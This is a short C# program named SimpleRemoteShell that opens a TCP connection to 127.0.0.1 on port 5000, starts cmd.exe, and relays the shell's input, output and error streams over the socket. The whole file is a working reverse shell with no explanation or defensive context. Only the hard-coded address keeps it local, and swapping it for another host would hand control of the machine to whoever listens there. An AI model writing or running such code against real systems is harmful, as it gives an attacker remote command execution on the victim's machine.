using System.Diagnostics;
using System.Net.Sockets;

namespace SimpleRemoteShell
{
    internal class Program
    {
        static void Main(string[] args)
        {
            var client = new TcpClient("127.0.0.1", 5000);
            var stream = client.GetStream();
            var proc = new Process();
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.RedirectStandardInput = true;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.RedirectStandardError = true;
            proc.StartInfo.ArgumentList.Add("-i");
            proc.Start();
            
            //proc.OutputDataReceived += (_, e) => stream.Write(System.Text.Encoding.UTF8.GetBytes(e.Data + "\n"));

            //proc.BeginErrorReadLine();
            //proc.BeginOutputReadLine();

            var buf = new byte[1024];

            var t = new Thread(
                () =>
                {
                    var buf = new byte[1024];
                    while (true)
                    {
                        int c = proc.StandardOutput.BaseStream.ReadAtLeast(buf, 1);
                        stream.Write(buf, 0, c);
                    }
                });

            var t2 = new Thread(
                () =>
                {
                    var buf = new byte[1024];
                    while (true)
                    {
                        int c = proc.StandardError.BaseStream.ReadAtLeast(buf, 1);
                        stream.Write(buf, 0, c);
                    }
                });

            t.Start();
            t2.Start();

            while (true)
            {
                var c = stream.ReadAtLeast(buf, 1);
                proc.StandardInput.Write(buf.Select(x => (char)x).ToArray(), 0, c);
            }
        }
    }
}